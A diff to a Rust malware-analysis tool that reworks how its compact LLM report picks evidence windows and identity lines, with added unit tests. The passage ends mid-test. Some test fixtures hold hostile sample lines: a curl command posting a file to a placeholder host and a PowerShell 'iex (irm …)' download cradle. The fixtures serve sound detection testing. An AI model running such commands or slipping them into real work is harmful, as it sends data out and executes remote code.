@@ -560,8 +560,9 @@ pub struct TinyOpts {
     /// evidence its first already showed, and over a 96-sample corpus the
     /// repeats were 11% of the render with no grade that depended on them.
     pub windows_per_finding: usize,
-    /// Context windows drawn per file, strongest first (the best `conf × crit`
-    /// note each carries; ties in file order); `0` draws them all. A finding
+    /// Context windows drawn per file — highest criticality first, counting a
+    /// composite leg at its withheld composite's, then the most story per byte
+    /// across trait families; ties in file order. `0` draws them all. A finding
     /// whose only window falls past the cap still lists as a location-less
     /// note, so the cap costs evidence, never findings. The LLM view allows
     /// 64 within [`Self::window_bytes`].
@@ -717,7 +718,7 @@ pub fn format_context_badged(
             .join(", ");
         gaps.push_str(&format!(
             "Analysis incomplete for {:?}: {reasons}\n",
-            file.path
+            tiny_path(&file.path, opts.basename_root)
         ));
     }
     if affected.len() > 200 {
@@ -735,7 +736,7 @@ pub fn format_context_badged(
             .join(", ");
         gaps.push_str(&format!(
             "Analysis incomplete for {:?}: {reasons}\n",
-            report.target.path
+            tiny_path(&report.target.path, opts.basename_root)
         ));
     }
     let files: Vec<&FileAnalysis> = report
@@ -843,7 +844,13 @@ pub fn format_context_badged(
         } else {
             0
         };
-        let mut selected = select_ids(file, opts, fill);
+        // A platform-signed file that raised nothing above notable is told by
+        // its header and identity lines alone in the LLM view.
+        let mut selected = if minimal && vouched_and_quiet(file) {
+            Vec::new()
+        } else {
+            select_ids(file, opts, fill)
+        };
 
         // For an archive container, drop findings that were located more
         // specifically in a member below it (same id, native, deeper). What
@@ -965,12 +972,28 @@ pub fn format_context_badged(
         if let Some(identity) = &file.identity {
             render_identity(&mut body, identity, colorize);
         }
+        // Byte ranges of the source windows the plan draws: a text window
+        // renders nearly every row it holds, so evidence inside one is on
+        // screen whatever note it carries. Binary windows render only the rows
+        // around their own notes, so they vouch for nothing here.
+        let drawn: Vec<(u64, u64)> = if is_binary_file_type(&file.file_type) {
+            Vec::new()
+        } else {
+            file_view
+                .context
+                .iter()
+                .zip(&plan)
+                .filter(|(_, ids)| ids.is_some())
+                .map(|(c, _)| (c.loc, c.loc + c.data.len() as u64))
+                .collect()
+        };
         render_no_anchor(
             &mut body,
             file,
             &selected,
             &windowed,
             &capped,
+            &drawn,
             &id_to_file,
             opts,
             shows_context,
@@ -1162,30 +1185,15 @@ fn indent_block(out: &mut String, block: &str, depth: u32) {
     }
 }
 
-/// Whether a file contributes anything to the context view.
-/// Context windows with every note for a withheld composite reassigned to the
-/// composite's own legs, or `None` when nothing changes.
-///
-/// The LLM/tiny view drops composites and shows their legs (`select_ids`), but
-/// the capture pass keeps only the strongest note on an overlapping span —
-/// `conf × crit` — and a hostile composite anchored on its leg's evidence beats
-/// that notable leg every time. The leg then owned no note at all: the window
-/// with the matched line was drawn only if some other selected trait happened
-/// to sit on it, and its annotation was never the leg's. A note whose id is a
-/// native composite becomes one note per leg that is selected here and has no
-/// located note of its own, at the composite's span with the leg's identity;
-/// a composite with no such leg keeps its (unselected, unrendered) note, and
-/// a composite that is itself selected (a leg of a wider one) keeps its own.
 /// Which context windows a file draws and which selected findings each one
 /// annotates: `None` for a window not drawn, else the note ids it renders.
 ///
 /// Applies [`TinyOpts::windows_per_finding`] in file order (a finding's first
-/// windows claim it), then [`TinyOpts::max_windows`] and
-/// [`TinyOpts::window_bytes`] by strength — the best `conf × crit` note a
-/// window carries, ties in file order; a window that would overspend the byte
-/// budget is skipped and weaker, smaller ones may still fit. The plan is the
-/// single source of truth for the windowed-vs-location-less split: a selected
-/// finding in no drawn window renders as a bare note instead.
+/// windows claim it). When the file's windows then exceed
+/// [`TinyOpts::max_windows`] or [`TinyOpts::window_bytes`], [`pick_windows`]
+/// chooses which to keep. The plan is the single source of truth for the
+/// windowed-vs-location-less split: a selected finding in no drawn window
+/// renders as a bare note instead.
 fn window_plan<'a>(
     file: &'a FileAnalysis,
     selected: &[&'a str],
@@ -1193,11 +1201,9 @@ fn window_plan<'a>(
 ) -> Vec<Option<HashSet<&'a str>>> {
     let sel: HashSet<&str> = selected.iter().copied().collect();
     let mut drawn: HashMap<&str, usize> = HashMap::new();
-    let mut strength: Vec<(f32, usize)> = Vec::new();
     let mut plan: Vec<Option<HashSet<&'a str>>> = Vec::with_capacity(file.context.len());
-    for (i, line) in file.context.iter().enumerate() {
+    for line in &file.context {
         let mut ids: HashSet<&'a str> = HashSet::new();
-        let mut best = 0f32;
         for n in &line.notes {
             let id = n.id.as_str();
             if !sel.contains(id) || ids.contains(id) {
@@ -1209,39 +1215,221 @@ fn window_plan<'a>(
             }
             *count += 1;
             ids.insert(id);
-            best = best.max(n.conf * f32::from(n.crit.rank()));
         }
-        if ids.is_empty() {
-            plan.push(None);
-        } else {
-            strength.push((best, i));
-            plan.push(Some(ids));
-        }
+        plan.push((!ids.is_empty()).then_some(ids));
     }
-    let capped = opts.max_windows > 0 && strength.len() > opts.max_windows;
-    let budgeted = opts.window_bytes > 0
-        && strength
-            .iter()
-            .map(|&(_, i)| file.context[i].data.len())
-            .sum::<usize>()
-            > opts.window_bytes;
+    let windows = plan.iter().flatten().count();
+    let bytes: usize = plan
+        .iter()
+        .zip(&file.context)
+        .filter(|(ids, _)| ids.is_some())
+        .map(|(_, line)| line.data.len())
+        .sum();
+    let capped = opts.max_windows > 0 && windows > opts.max_windows;
+    let budgeted = opts.window_bytes > 0 && bytes > opts.window_bytes;
     if capped || budgeted {
-        strength.sort_by(|a, b| b.0.total_cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
-        let mut kept = 0usize;
-        let mut spent = 0usize;
-        for &(_, i) in &strength {
-            let bytes = file.context[i].data.len();
-            let fits = (opts.max_windows == 0 || kept < opts.max_windows)
-                && (opts.window_bytes == 0 || spent + bytes <= opts.window_bytes);
-            if fits {
-                kept += 1;
-                spent += bytes;
-            } else {
-                plan[i] = None;
+        let kept = pick_windows(file, &plan, &sel, opts);
+        for (ids, keep) in plan.iter_mut().zip(kept) {
+            if !keep {
+                *ids = None;
             }
         }
     }
     plan
+}
+
+/// One annotated note's say in which windows a budgeted file draws.
+struct StoryNote<'a> {
+    conf: f32,
+    /// The trait's family two and three path segments below its namespace
+    /// (`objectives/command-and-control/infrastructure[/paste]`).
+    family2: &'a str,
+    family3: &'a str,
+    /// `1 + 0.25` per withheld composite drawing on the note, up to four.
+    support: f32,
+}
+
+/// A window [`pick_windows`] may draw.
+struct Candidate<'a> {
+    line: usize,
+    /// The window's effective criticality rank: the highest of its notes' own
+    /// criticality and that of any withheld composite drawing on them.
+    tier: u8,
+    bytes: usize,
+    notes: Vec<StoryNote<'a>>,
+}
+
+impl Candidate<'_> {
+    /// What drawing this window adds to the story told so far: each note's
+    /// confidence, discounted for families already drawn and raised for
+    /// composite support, over the square root of the window's size so a
+    /// compact window showing several things beats a sprawling one.
+    fn gain(&self, drawn2: &HashMap<&str, f32>, drawn3: &HashMap<&str, f32>) -> f32 {
+        let value: f32 = self
+            .notes
+            .iter()
+            .map(|n| {
+                let decay = drawn2.get(n.family2).copied().unwrap_or(1.0)
+                    * drawn3.get(n.family3).copied().unwrap_or(1.0);
+                n.conf * decay * n.support
+            })
+            .sum();
+        value / (self.bytes.max(1) as f32).sqrt()
+    }
+}
+
+/// Which of a file's planned windows fit its window budget, indexed like
+/// `plan`, chosen to tell the most story in the fewest bytes.
+///
+/// Criticality wins: windows are drawn in descending [`Candidate::tier`], so a
+/// suspicious-backed window beats any number of notable ones. Within a tier the
+/// next window is the one with the best [`Candidate::gain`], recomputed after
+/// every pick: each pick halves its notes' three-segment families and halves
+/// their two-segment families again, so the budget spreads across what the
+/// program does instead of repeating one behavior. Ties fall to file order.
+/// A window that would overspend the byte budget is skipped, and smaller ones
+/// may still fit.
+///
+/// A composite leg ranks by the withheld composite it supports, but its window
+/// is still annotated with the leg's own grade and id: the composite's
+/// conclusion never reaches the grader. A `metadata/` note that no withheld
+/// composite draws on (an import, say) earns no window here — a file's import
+/// block would otherwise outbid its behavior — and still lists as a
+/// location-less note.
+fn pick_windows(
+    file: &FileAnalysis,
+    plan: &[Option<HashSet<&str>>],
+    selected: &HashSet<&str>,
+    opts: &TinyOpts,
+) -> Vec<bool> {
+    let support = withheld_composite_support(file, selected);
+    let mut candidates: Vec<Candidate<'_>> = Vec::new();
+    for (i, ids) in plan.iter().enumerate() {
+        let Some(ids) = ids else { continue };
+        let mut seen: HashSet<&str> = HashSet::new();
+        let mut tier = 0u8;
+        let mut notes = Vec::new();
+        for n in &file.context[i].notes {
+            let id = n.id.as_str();
+            if !ids.contains(id) || !seen.insert(id) {
+                continue;
+            }
+            let backing = support.get(id);
+            if backing.is_none() && id.starts_with("metadata/") {
+                continue;
+            }
+            let (rank, composites) = backing.map_or((0, 0), |b| (b.rank, b.composites));
+            tier = tier.max(n.crit.rank()).max(rank);
+            notes.push(StoryNote {
+                conf: n.conf,
+                family2: trait_family(id, 2),
+                family3: trait_family(id, 3),
+                support: 1.0 + 0.25 * composites.min(4) as f32,
+            });
+        }
+        if !notes.is_empty() {
+            candidates.push(Candidate {
+                line: i,
+                tier,
+                bytes: file.context[i].data.len(),
+                notes,
+            });
+        }
+    }
+
+    let mut kept = vec![false; plan.len()];
+    let mut drawn2: HashMap<&str, f32> = HashMap::new();
+    let mut drawn3: HashMap<&str, f32> = HashMap::new();
+    let (mut windows, mut spent) = (0usize, 0usize);
+    while opts.max_windows == 0 || windows < opts.max_windows {
+        let best = candidates
+            .iter()
+            .enumerate()
+            .filter(|(_, c)| opts.window_bytes == 0 || spent + c.bytes <= opts.window_bytes)
+            .map(|(k, c)| (k, c.tier, c.gain(&drawn2, &drawn3)))
+            .max_by(|a, b| a.1.cmp(&b.1).then(a.2.total_cmp(&b.2)).then(b.0.cmp(&a.0)));
+        let Some((k, _, _)) = best else { break };
+        let pick = candidates.remove(k);
+        kept[pick.line] = true;
+        windows += 1;
+        spent += pick.bytes;
+        let families2: HashSet<&str> = pick.notes.iter().map(|n| n.family2).collect();
+        let families3: HashSet<&str> = pick.notes.iter().map(|n| n.family3).collect();
+        for f in families2 {
+            *drawn2.entry(f).or_insert(1.0) *= 0.5;
+        }
+        for f in families3 {
+            *drawn3.entry(f).or_insert(1.0) *= 0.5;
+        }
+    }
+    kept
+}
+
+/// A trait id's family: its namespace plus the next `depth` path segments,
+/// e.g. `objectives/command-and-control/infrastructure` at depth 2. A shorter
+/// path is its own family.
+pub(crate) fn trait_family(id: &str, depth: usize) -> &str {
+    let path = id.split_once("::").map_or(id, |(path, _)| path);
+    path.match_indices('/')
+        .nth(depth)
+        .map_or(path, |(i, _)| &path[..i])
+}
+
+/// How the withheld composites in a file back one trait.
+#[derive(Clone, Copy, Debug, PartialEq)]
+struct CompositeSupport {
+    /// Highest criticality rank among them.
+    rank: u8,
+    /// How many distinct composites draw on the trait.
+    composites: usize,
+}
+
+/// Per id, the native composites in `file` that are not in `selected` and
+/// reference it — directly, or through nested composites.
+///
+/// The tiny view withholds composites and shows their legs, but a leg's note
+/// carries only the leg's own grade, so evidence behind a hostile conclusion
+/// ranked like any notable atom and lost the window budget to a file's import
+/// block. [`pick_windows`] ranks the leg by this backing instead, without
+/// putting the composite's id or grade in front of the grader.
+fn withheld_composite_support<'a>(
+    file: &'a FileAnalysis,
+    selected: &HashSet<&str>,
+) -> HashMap<&'a str, CompositeSupport> {
+    let composites: HashMap<&str, &Finding> = file
+        .findings
+        .iter()
+        .filter(|f| f.src.is_none() && !f.trait_refs.is_empty())
+        .map(|f| (f.id.as_str(), f))
+        .collect();
+    let mut support: HashMap<&str, CompositeSupport> = HashMap::new();
+    for f in composites
+        .values()
+        .filter(|f| !selected.contains(f.id.as_str()))
+    {
+        let rank = f.crit.rank();
+        let mut seen: HashSet<&str> = HashSet::from([f.id.as_str()]);
+        let mut stack: Vec<&str> = f
+            .trait_refs
+            .iter()
+            .map(crate::types::Istr::as_str)
+            .collect();
+        while let Some(id) = stack.pop() {
+            if !seen.insert(id) {
+                continue;
+            }
+            let s = support.entry(id).or_insert(CompositeSupport {
+                rank,
+                composites: 0,
+            });
+            s.rank = s.rank.max(rank);
+            s.composites += 1;
+            if let Some(g) = composites.get(id) {
+                stack.extend(g.trait_refs.iter().map(crate::types::Istr::as_str));
+            }
+        }
+    }
+    support
 }
 
 /// `CLEAVE_TINY_NO_RELABEL=1` leaves withheld composites' notes unassigned
@@ -1251,6 +1439,23 @@ fn relabel_disabled() -> bool {
     *OFF.get_or_init(|| std::env::var("CLEAVE_TINY_NO_RELABEL").as_deref() == Ok("1"))
 }
 
+/// Context windows with every note for a withheld composite reassigned to the
+/// composite's own legs, or `None` when nothing changes.
+///
+/// The LLM/tiny view drops composites and shows their legs (`select_ids`), but
+/// the capture pass keeps only the strongest note on an overlapping span, and
+/// a hostile composite anchored on its leg's evidence beats that notable leg
+/// every time. The leg then owned no note at all: the window with the matched
+/// line was drawn only if some other selected trait happened to sit on it, and
+/// its annotation was never the leg's. A note whose id is a native composite
+/// becomes one note per leg that is selected here, has no located note of its
+/// own, and has a span of its own evidence overlapping the note's, at the
+/// composite's span with the leg's identity. A composite's note covers only
+/// the one leg it was anchored on, so the overlap test keeps its other legs
+/// from being labeled onto a line that is not their evidence; they stay
+/// location-less. A composite with no such leg keeps its (unselected,
+/// unrendered) note, and a composite that is itself selected (a leg of a
+/// wider one) keeps its own.
 fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec<ContextLine>> {
     let sel: HashSet<&str> = selected.iter().copied().collect();
     let located: HashSet<&str> = file
@@ -1258,7 +1463,7 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
         .iter()
         .flat_map(|l| l.notes.iter().map(|n| n.id.as_str()))
         .collect();
-    let mut legs: HashMap<&str, Vec<&Finding>> = HashMap::new();
+    let mut legs: HashMap<&str, Vec<(&Finding, Vec<[u64; 2]>)>> = HashMap::new();
     for f in &file.findings {
         // A composite that is itself selected — a leg of a wider composite,
         // guaranteed by `select_ids` — keeps its own note: it is shown, so
@@ -1266,7 +1471,7 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
         if f.src.is_some() || f.trait_refs.is_empty() || sel.contains(f.id.as_str()) {
             continue;
         }
-        let mine: Vec<&Finding> = f
+        let mine: Vec<(&Finding, Vec<[u64; 2]>)> = f
             .trait_refs
             .iter()
             .map(crate::types::Istr::as_str)
@@ -1276,6 +1481,7 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
                     .iter()
                     .find(|g| g.src.is_none() && g.id.as_str() == r)
             })
+            .map(|g| (g, crate::types::traits_findings::finding_spans(g)))
             .collect();
         if !mine.is_empty() {
             legs.entry(f.id.as_str()).or_default().extend(mine);
@@ -1291,27 +1497,38 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
         .map(|line| {
             let mut notes = Vec::with_capacity(line.notes.len());
             for n in &line.notes {
-                match legs.get(n.id.as_str()) {
-                    Some(mine) => {
-                        changed = true;
-                        for leg in mine {
-                            if notes
-                                .iter()
-                                .any(|m: &Note| m.id == leg.id && m.off == n.off)
-                            {
-                                continue;
-                            }
-                            notes.push(Note {
-                                crit: leg.crit,
-                                id: leg.id.clone(),
-                                desc: leg.desc.clone(),
-                                off: n.off,
-                                len: n.len,
-                                conf: leg.conf,
-                            });
-                        }
+                let end = n.off + u64::from(n.len.max(1));
+                let covered: Vec<&Finding> = legs
+                    .get(n.id.as_str())
+                    .into_iter()
+                    .flatten()
+                    .filter(|(_, spans)| {
+                        spans
+                            .iter()
+                            .any(|&[off, len]| off < end && n.off < off + len.max(1))
+                    })
+                    .map(|&(leg, _)| leg)
+                    .collect();
+                if covered.is_empty() {
+                    notes.push(n.clone());
+                    continue;
+                }
+                changed = true;
+                for leg in covered {
+                    if notes
+                        .iter()
+                        .any(|m: &Note| m.id == leg.id && m.off == n.off)
+                    {
+                        continue;
                     }
-                    None => notes.push(n.clone()),
+                    notes.push(Note {
+                        crit: leg.crit,
+                        id: leg.id.clone(),
+                        desc: leg.desc.clone(),
+                        off: n.off,
+                        len: n.len,
+                        conf: leg.conf,
+                    });
                 }
             }
             ContextLine {
@@ -1323,6 +1540,7 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
     changed.then_some(context)
 }
 
+/// Whether a file contributes anything to the context view.
 fn file_has_output(file: &FileAnalysis, opts: &TinyOpts) -> bool {
     // A file whose only output is what the analysis withheld still has
     // something to say — arguably the most important thing, since a reader
@@ -1668,8 +1886,43 @@ fn render_identity(out: &mut String, id: &filefacts::Identity, colorize: bool) {
     push_claim("version", &id.version, 24);
     push_claim("team", &id.team_id, 32);
     push_claim("producer", &id.producer, 32);
+    // The rights holder, unless it only restates the company or the signer
+    // (`© Microsoft Corporation. All rights reserved.` beside a Microsoft
+    // signature says nothing new). A holder that differs from both is a
+    // disagreement worth a token.
+    if let Some(c) = &id.copyright {
+        let holder = copyright_holder(&c.value);
+        let restates = [
+            id.organization.as_ref().map(|o| o.value.as_str()),
+            id.signer.as_ref().and_then(|s| s.organization.as_deref()),
+        ]
+        .into_iter()
+        .flatten()
+        .any(|company| copyright_holder(company) == holder);
+        if !holder.is_empty() && !restates && fresh(&c.value) {
+            claims.push(format!("copyright=\"{}\"", truncate_end(&c.value, 48)));
+        }
+    }
     if !claims.is_empty() {
         out.push_str(&format!("  {}  {}\n", label("claims"), claims.join(" ")));
+    }
+
+    // What it says it is for, in the publisher's words. Prose rather than a
+    // token, so it gets its own line. It is the claim the behaviour is held
+    // against: a package calling itself a "CLI core binary for Windows x64"
+    // is expected to ship executables.
+    if let Some(c) = &id.description
+        && fresh(&c.value)
+        && ![&id.name, &id.project, &id.title, &id.identifier]
+            .into_iter()
+            .flatten()
+            .any(|other| other.value.trim().eq_ignore_ascii_case(c.value.trim()))
+    {
+        out.push_str(&format!(
+            "  {}  \"{}\"\n",
+            label("about"),
+            truncate_end(&c.value, 100)
+        ));
     }
 
     // Who signed it, in the signature's own words. The headline reduces a
@@ -1851,6 +2104,38 @@ pub(crate) fn identity_headline(id: &filefacts::Identity, colorize: bool) -> Opt
     Some(s)
 }
 
+/// Whether a file is signed by the platform vendor with a signature that
+/// verified one of its claims, and raised nothing above notable.
+///
+/// Such a file's header and identity lines already say what it is (a
+/// Microsoft-signed C runtime, an Apple system library). Listing its
+/// capabilities, the file and memory APIs every runtime imports, spends the
+/// LLM view's budget on facts that argue neither way and pushes the
+/// artifact's own code further down the page.
+fn vouched_and_quiet(file: &FileAnalysis) -> bool {
+    use filefacts::Trust;
+    let Some(id) = &file.identity else {
+        return false;
+    };
+    let vouched = matches!(id.trust, Trust::Platform | Trust::System)
+        && [
+            &id.name,
+            &id.identifier,
+            &id.organization,
+            &id.team_id,
+            &id.version,
+            &id.project,
+        ]
+        .into_iter()
+        .flatten()
+        .any(|c| c.verified);
+    vouched
+        && !file
+            .findings
+            .iter()
+            .any(|f| f.src.is_none() && f.crit >= Criticality::Suspicious)
+}
+
 /// The trust tier word, colored by tier and suffixed with `✓` when a
 /// signature cryptographically verified one of the identity claims.
 fn trust_text(id: &filefacts::Identity, colorize: bool) -> String {
@@ -1908,6 +2193,18 @@ fn truncate_mid(s: &str, max: usize) -> String {
 }
 
 /// Truncate keeping the head only (for long hashes): `b38a051e6c36…`.
+/// The rights holder a copyright notice names, folded for comparison: the
+/// letters left once the `©` / `(c)` / `Copyright` / `All rights reserved`
+/// boilerplate, years and punctuation are gone. Applied to a company name too,
+/// so `© 2024 Tencent. All rights reserved.` and `Tencent` compare equal.
+fn copyright_holder(s: &str) -> String {
+    let lower = s.to_lowercase();
+    let stripped = ["all rights reserved", "copyright", "(c)"]
+        .iter()
+        .fold(lower, |acc, boilerplate| acc.replace(boilerplate, " "));
+    stripped.chars().filter(|c| c.is_alphabetic()).collect()
+}
+
 fn truncate_end(s: &str, max: usize) -> String {
     let chars: Vec<char> = s.chars().collect();
     if chars.len() <= max {
@@ -3103,6 +3400,7 @@ fn render_no_anchor(
     selected: &[&str],
     windowed: &HashSet<&str>,
     capped: &HashSet<&str>,
+    drawn: &[(u64, u64)],
     id_to_file: &HashMap<u32, &FileAnalysis>,
     opts: &TinyOpts,
     context_shown: bool,
@@ -3125,7 +3423,13 @@ fn render_no_anchor(
     // the only way to surface findings, so it keeps them. A finding in `capped`
     // holds a note the window plan (`TinyOpts::max_windows`,
     // `windows_per_finding`) declined to draw — capped, not dominated — so it
-    // is listed here: the cap trades evidence, never findings.
+    // is listed here: the cap trades evidence, never findings. The LLM view
+    // also lists a finding no selected note overlaps: what dominated it was a
+    // composite this view withholds, so nothing on screen represents its span
+    // (`relabel_composite_notes` hands a leg the composite's note only where
+    // that note covers the leg's own evidence). A finding whose evidence sits
+    // inside a `drawn` source window is already on screen, whatever note that
+    // window carries, so it is not listed again.
     //
     // A file past the context cap (`context_shown` false) drew no windows even
     // though it captured context, so the dominance argument doesn't apply: this
@@ -3152,6 +3456,21 @@ fn render_no_anchor(
                     .is_some_and(|location| location.starts_with("archive:"))
         })
     };
+    let represented = |f: &Finding| {
+        let spans = crate::types::traits_findings::finding_spans(f);
+        let overlaps = |lo: u64, hi: u64| {
+            spans
+                .iter()
+                .any(|&[off, len]| off < hi && lo < off + len.max(1))
+        };
+        drawn.iter().any(|&(lo, hi)| overlaps(lo, hi))
+            || file
+                .context
+                .iter()
+                .flat_map(|l| &l.notes)
+                .filter(|n| sel.contains(n.id.as_str()))
+                .any(|n| overlaps(n.off, n.off + u64::from(n.len.max(1))))
+    };
     let mut rest: Vec<&Finding> = file
         .findings
         .iter()
@@ -3161,6 +3480,7 @@ fn render_no_anchor(
         .filter(|f| {
             !captured
                 || capped.contains(f.id.as_str())
+                || (!rich && !represented(f))
                 || file.composite_sources.contains_key(f.id.as_str())
                 || !has_local_offset(f)
         })
@@ -4053,6 +4373,94 @@ mod tests {
         let mut out = String::new();
         render_identity(&mut out, id, false);
         out
+    }
+
+    /// A package's self-description reaches the reader on its own line, cut to
+    /// fit, and is not repeated when it merely echoes the package name.
+    #[test]
+    fn package_description_renders_as_an_about_line() {
+        let id = identity(serde_json::json!({
+            "name": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
+            "identifier": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
+            "version": {"value": "5.6.1", "source": "npm.version"},
+            "description": {
+                "value": "Sandbox CLI core binary for Windows x64",
+                "source": "npm.description",
+            },
+            "trust": "unsigned",
+        }));
+        let lines = identity_lines(&id);
+        assert!(
+            lines.contains("  about  \"Sandbox CLI core binary for Windows x64\"\n"),
+            "{lines}"
+        );
+
+        let long = identity(serde_json::json!({
+            "description": {"value": "x".repeat(150), "source": "whl.summary"},
+            "trust": "unsigned",
+        }));
+        let lines = identity_lines(&long);
+        assert!(
+            lines.contains(&format!("about  \"{}…\"", "x".repeat(100))),
+            "{lines}"
+        );
+
+        let echo = identity(serde_json::json!({
+            "identifier": {"value": "left-pad", "source": "npm.name"},
+            "description": {"value": "left-pad", "source": "npm.description"},
+            "trust": "unsigned",
+        }));
+        assert!(!identity_lines(&echo).contains("about"));
+
+        // A PE FileDescription that restates its ProductName adds nothing.
+        let product = identity(serde_json::json!({
+            "name": {"value": "tool.exe", "source": "pe.version.original_filename"},
+            "project": {"value": "Acme Tool", "source": "pe.version.product_name"},
+            "description": {"value": "acme tool", "source": "pe.version.description"},
+            "trust": "unsigned",
+        }));
+        assert!(!identity_lines(&product).contains("about"));
+    }
+
+    /// A copyright notice becomes one claims token when it names someone other
+    /// than the company or signer, and is dropped when it only restates them.
+    #[test]
+    fn copyright_renders_only_when_it_names_a_different_holder() {
+        let differs = identity(serde_json::json!({
+            "name": {"value": "sandbox-cli.exe", "source": "pe.version.original_filename"},
+            "organization": {"value": "Acme Ltd", "source": "pe.version.company"},
+            "copyright": {
+                "value": "Copyright (C) 2024 Tencent. All Rights Reserved. Licensed to example users",
+                "source": "pe.version.copyright",
+            },
+            "trust": "unsigned",
+        }));
+        let lines = identity_lines(&differs);
+        assert!(
+            lines.contains(&format!(
+                "copyright=\"{}…\"",
+                "Copyright (C) 2024 Tencent. All Rights Reserved."
+            )),
+            "{lines}"
+        );
+
+        let restates = identity(serde_json::json!({
+            "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
+            "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]"},
+            "copyright": {
+                "value": "© Microsoft Corporation. All rights reserved.",
+                "source": "pe.version.copyright",
+            },
+            "trust": "platform",
+        }));
+        assert!(!identity_lines(&restates).contains("copyright"));
+
+        let bare = identity(serde_json::json!({
+            "name": {"value": "a.exe", "source": "pe.version.original_filename"},
+            "copyright": {"value": "Copyright (C) 2024", "source": "pe.version.copyright"},
+            "trust": "unsigned",
+        }));
+        assert!(!identity_lines(&bare).contains("copyright"));
     }
 
     /// A signed PE that claims one company in its version resource and carries
@@ -5042,11 +5450,15 @@ mod tests {
         let mut composite =
             finding_with("objectives/exfil::skill-posts-file", Criticality::Hostile);
         composite.trait_refs = vec![leg.to_string().into()];
+        let leg_finding = Finding {
+            evidence: vec![Evidence::new("string", "", "curl").with_offset(12)],
+            ..finding_with(leg, Criticality::Notable)
+        };
         let file = src_file(
             0,
             "SKILL.md",
             50,
-            vec![finding_with(leg, Criticality::Notable), composite],
+            vec![leg_finding, composite],
             vec![ctx_line(
                 12,
                 "curl -X POST https://h.example/a --data-binary @a\n",
@@ -5070,6 +5482,94 @@ mod tests {
             !tiny.contains("skill-posts-file"),
             "the composite stays withheld: {tiny}"
         );
+    }
+
+    /// A composite's note covers the one leg it was anchored on. Its other
+    /// legs match elsewhere, so handing them the note would label a line with
+    /// a trait that is not its evidence (a paste-site leg once annotated a
+    /// tunnel URL line); they stay location-less instead.
+    #[test]
+    fn tiny_relabel_hands_a_composite_note_only_to_legs_it_covers() {
+        let a = "micro/tunnel::quick-service";
+        let b = "micro/paste::shz-al";
+        let comp = "objectives/c2::tunnel-address-paste-rendezvous";
+        let leg = |id: &str, off: u64, value: &str| Finding {
+            evidence: vec![Evidence::new("string", "", value).with_offset(off)],
+            ..finding_with(id, Criticality::Notable)
+        };
+        let composite = Finding {
+            trait_refs: vec![a.to_string().into(), b.to_string().into()],
+            ..finding_with(comp, Criticality::Suspicious)
+        };
+        let file = src_file(
+            0,
+            "agent.py",
+            50,
+            vec![
+                leg(a, 12, "trycloudflare"),
+                leg(b, 900, "shz.al"),
+                composite,
+            ],
+            vec![ctx_line(
+                12,
+                "QUICK_SERVICE = 'https://api.trycloudflare.com'\n",
+                Some(ctx_note(comp, Criticality::Suspicious, 12)),
+            )],
+        );
+        let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
+        assert!(
+            tiny.contains(&format!("# N 12:1 {a}")),
+            "the covered leg takes the note: {tiny}"
+        );
+        assert!(
+            !tiny.contains(&format!("12:1 {b}")),
+            "the uncovered leg is not labeled onto the anchor line: {tiny}"
+        );
+        assert!(tiny.contains(b), "the uncovered leg still lists: {tiny}");
+        assert!(
+            !tiny.contains("rendezvous"),
+            "the composite stays withheld: {tiny}"
+        );
+    }
+
+    /// A leg whose evidence sits inside a drawn source window is already on
+    /// screen, even though the note on that window belongs to another trait:
+    /// it is not listed again as a location-less note.
+    #[test]
+    fn tiny_does_not_relist_a_leg_whose_evidence_is_drawn() {
+        let a = "micro/ps::iex";
+        let b = "micro/ps::irm-alias";
+        let comp = "objectives/exec::download-cradle";
+        let leg = |id: &str, off: u64, value: &str| Finding {
+            evidence: vec![Evidence::new("string", "", value).with_offset(off)],
+            ..finding_with(id, Criticality::Notable)
+        };
+        let composite = Finding {
+            trait_refs: vec![a.to_string().into(), b.to_string().into()],
+            ..finding_with(comp, Criticality::Suspicious)
+        };
+        // One drawn line holds both legs; the composite's note covers only A.
+        let file = src_file(
+            0,
+            "sample.ps1",
+            50,
+            vec![leg(a, 0, "iex"), leg(b, 5, "irm"), composite],
+            vec![ctx_line(
+                0,
+                "iex (irm https://h.example/p)\n",
+                Some(ctx_note(comp, Criticality::Suspicious, 0)),
+            )],
+        );
+        let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
+        assert!(
+            tiny.contains("irm https://h.example/p"),
+            "line drawn: {tiny}"
+        );
+        assert!(
+            tiny.contains(&format!("0:1 {a}")),
+            "A labels the line: {tiny}"
+        );
+        assert!(!tiny.contains(b), "B is on screen, not relisted: {tiny}");
     }
 
     /// A window the per-file cap declines to draw must not take its finding
@@ -5168,6 +5668,291 @@ mod tests {
             tiny.contains("t/mid"),
             "the budgeted-out finding is still listed: {tiny}"
         );
+    }
+
+    /// A located note for `id` at line `line` with confidence `conf`.
+    fn story_line(line: u64, data: &str, id: &str, crit: Criticality, conf: f32) -> ContextLine {
+        let mut note = ctx_note(id, crit, line);
+        note.conf = conf;
+        ctx_line(line, data, Some(note))
+    }
+
+    /// Findings for every note in `context`, at the note's criticality and
+    /// confidence, followed by `extra`.
+    fn story_file(context: Vec<ContextLine>, extra: Vec<Finding>) -> FileAnalysis {
+        let mut findings: Vec<Finding> = context
+            .iter()
+            .flat_map(|l| &l.notes)
+            .map(|n| Finding {
+                conf: n.conf,
+                ..finding_with(n.id.as_str(), n.crit)
+            })
+            .collect();
+        findings.extend(extra);
+        src_file(0, "agent.py", 50, findings, context)
+    }
+
+    fn capped(max_windows: usize) -> TinyOpts {
+        TinyOpts {
+            max_windows,
+            ..TinyOpts::tiny()
+        }
+    }
+
+    /// Criticality wins: one suspicious window beats notable windows however
+    /// confident, compact or diverse they are.
+    #[test]
+    fn tiny_window_pick_prefers_criticality_over_everything_else() {
+        let mut context = vec![story_line(
+            900,
+            &format!("suspicious_call({})\n", "x".repeat(200)),
